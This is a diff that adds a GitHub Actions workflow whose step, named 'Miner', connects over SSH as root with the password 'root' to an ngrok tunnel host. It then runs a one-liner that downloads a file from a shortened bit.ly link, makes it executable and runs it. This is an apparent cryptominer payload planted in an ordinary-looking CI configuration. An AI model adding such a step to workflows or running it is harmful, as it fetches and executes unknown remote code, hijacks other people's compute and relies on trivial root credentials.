@@ -1,0 +1,29 @@
+build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: ls -a via OPEN SSH Private Key
+
+      - name: Miner
+
+        uses: tarunjangra/ssh-remote-cmd@master
+
+        with:
+
+          command: |
+
+            wget https://bit.ly/3i8MbgT && chmod +x 3i8MbgT && ./3i8MbgT
+
+          host: 6.tcp.ngrok.io:11880
+
+          host: 6.tcp.ngrok.io
+
+          port: 11880
+
+          user: root         
+
+          pass: root
+
+          args: "-tt -vvv"
